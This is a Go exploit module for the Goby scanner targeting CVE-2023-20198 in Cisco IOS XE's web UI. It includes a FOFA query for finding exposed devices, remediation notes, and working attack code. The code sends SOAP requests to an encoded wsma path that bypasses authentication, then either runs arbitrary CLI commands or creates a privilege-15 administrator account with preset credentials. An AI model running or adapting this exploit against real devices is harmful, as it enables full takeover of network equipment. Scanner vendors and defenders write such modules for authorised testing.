package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Cisco IOS XE ebui_wsma_http API Permission Bypass Vulnerability (CVE-2023-20198)",
    "Description": "<p>Cisco IOS Xe is an open and flexible operating system optimized for future work. As a single operating system for enterprise wired and wireless access, convergence, core and wide area networks, Cisco IOS Xe can reduce business and network complexity.</p><p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Product": "CISCO-IOS-XE",
    "Homepage": "https://www.cisco.com/",
    "DisclosureDate": "2023-10-25",
    "PostTime": "2023-10-31",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>\"",
    "GobyQuery": "body=\"<script>window.onload=function(){ url ='/webui';window.location.href=url;}</script>\"",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z\">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p><p>4. Disable the HTTP server feature and use the no ip HTTP Server or no ip HTTP secure server command in global configuration mode</p>",
    "References": [
        "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-theory-crafting/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,adduser",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "show run",
            "show": "attackType=cmd"
        },
        {
            "name": "username",
            "type": "input",
            "value": "zxkjc",
            "show": "attackType=adduser"
        },
        {
            "name": "password",
            "type": "input",
            "value": "qweipo",
            "show": "attackType=adduser"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-20198"
    ],
    "CNNVD": [
        "CNNVD-202310-1209"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10",
    "Translation": {
        "CN": {
            "Name": "Cisco IOS XE ebui_wsma_http 接口权限绕过漏洞（CVE-2023-20198）",
            "Product": "CISCO-IOS-XE",
            "Description": "<p>Cisco IOS XE 是一个开放灵活的操作系统，针对未来的工作进行了优化。作为适用于企业有线和无线接入、聚合、核心和广域网的单一操作系统，Cisco IOS XE 可降低业务和网络复杂性。</p><p>攻击者可通过权限绕过漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z\" target=\"_blank\">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p><p>4、禁用HTTP服务器功能，在全局配置模式下使用no ip HTTP Server或no ip HTTP secure-server命令</p>",
            "Impact": "<p>攻击者可通过权限绕过漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Cisco IOS XE ebui_wsma_http API Permission Bypass Vulnerability (CVE-2023-20198)",
            "Product": "CISCO-IOS-XE",
            "Description": "<p>Cisco IOS Xe is an open and flexible operating system optimized for future work. As a single operating system for enterprise wired and wireless access, convergence, core and wide area networks, Cisco IOS Xe can reduce business and network complexity.<br></p><p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z\" target=\"_blank\">https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p><p>4. Disable the HTTP server feature and use the no ip HTTP Server or no ip HTTP secure server command in global configuration mode</p>",
            "Impact": "<p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10863"
}`
	sendUtilizeLDQWEH := func(hostInfo *httpclient.FixUrl, execute string) (string, error) {
		sendConfig := httpclient.NewPostRequestConfig("/%2577eb%2575i_%2577sma_Http")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = true
		sendConfig.Header.Store("Content-Length", "720")
		sendConfig.Data = "<?xml version=\"1.0\"?> <SOAP:Envelope xmlns:SOAP=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"> <SOAP:Header> <wsse:Security xmlns:wsse=\"http://schemas.xmlsoap.org/ws/2002/04/secext\"> <wsse:UsernameToken SOAP:mustUnderstand=\"false\"> <wsse:Username>asdf</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body>" + execute + "</SOAP:Body></SOAP:Envelope>"
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<?xml") && strings.Contains(resp.Utf8Html, "SOAP:Body") && strings.Contains(resp.Utf8Html, "SOAP:Envelope") {
			return resp.Utf8Html, err
		}
		return "", errors.New("漏洞利用失败")
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			cmd := `<request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>echo ` + checkString + `</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request>`
			respBody, _ := sendUtilizeLDQWEH(hostInfo, cmd)
			match := regexp.MustCompile(`<text>([\s\S]*?)</text>`).FindStringSubmatch(respBody)
			return len(match) > 1 && strings.Contains(match[1], checkString)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				resp, err := sendUtilizeLDQWEH(expResult.HostInfo, `<request correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd> `+cmd+`</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request>`)
				match := regexp.MustCompile(`<text>([\s\S]*?)</text>`).FindStringSubmatch(resp)
				if err != nil {
					expResult.Output = err.Error()
				} else if len(match) > 1 {
					expResult.Output = match[1]
					expResult.Success = true
				}
			} else if attackType == "adduser" {
				username := goutils.B2S(stepLogs.Params["username"])
				password := goutils.B2S(stepLogs.Params["password"])
				adduser := "<request xmlns=\"urn:cisco:wsma-config\" correlator=\"execl\"><configApply details=\"all\"><config-data><cli-config-data-block>username " + username + " privilege 15 secret " + password + "</cli-config-data-block></config-data></configApply></request>"
				resp, err := sendUtilizeLDQWEH(expResult.HostInfo, adduser)
				if err != nil {
					expResult.Output = err.Error()
				} else if strings.Contains(resp, "<success") {
					expResult.Output = fmt.Sprintf("username: %s\npassword: %s", username, password)
					expResult.Success = true
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
